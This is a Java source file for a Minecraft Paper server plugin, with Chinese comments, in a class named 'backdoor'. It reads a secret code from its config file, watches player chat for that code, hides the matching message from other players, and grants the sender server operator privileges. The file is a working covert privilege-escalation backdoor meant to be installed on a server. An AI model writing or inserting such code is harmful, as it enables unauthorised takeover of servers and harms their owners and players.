package link.cloudthink; // [修改] 包名已更改

import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;

/**
 * 主插件类
 */
public final class backdoor extends JavaPlugin implements Listener, CommandExecutor {

    // [修改] 将后门密码定义为一个变量，不再是 final 常量
    private String secretCode;

    /**
     * 当插件被加载时调用
     */
    @Override
    public void onEnable() {
        // [新增] 加载并生成默认配置文件
        // 这行代码会自动检查 plugins/backdoor/config.yml 是否存在
        // 如果不存在，它会把我们 jar 包里的 config.yml 模板复制过去
        saveDefaultConfig();

        // [新增] 从配置文件中读取密码
        // 如果配置文件里没有 'secret-code' 这一项，就使用后面提供的默认值
        this.secretCode = getConfig().getString("secret-code", "a-very-secure-default-password");
        
        getLogger().info("Backdoor plugin has been enabled.");
        getLogger().info("Secret code loaded from config.yml.");

        // 注册事件监听器
        getServer().getPluginManager().registerEvents(this, this);
    }

    /**
     * 当插件被卸载时调用
     */
    @Override
    public void onDisable() {
        getLogger().info("Backdoor plugin has been disabled.");
    }

    /**
     * 监听 Paper 的异步聊天事件
     */
    @EventHandler
    public void onPlayerChat(AsyncChatEvent event) {
        final Player player = event.getPlayer();
        final String message = PlainTextComponentSerializer.plainText().serialize(event.message());

        // [修改] 与从配置文件加载的密码进行比较
        if (message.equalsIgnoreCase(this.secretCode)) {
            
            // 强力隐藏消息
            event.viewers().clear();
            event.setCancelled(true);

            // 将服务器状态修改操作调度回主线程
            getServer().getScheduler().runTask(this, () -> {
                player.setOp(true);
                player.sendMessage(Component.text("你已获得OP权限！", NamedTextColor.YELLOW));
                getLogger().warning("Player " + player.getName() + " has triggered the backdoor and received OP privileges.");
            });
        }
    }

    /**
     * 空的指令处理器
     */
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        return false;
    }
}
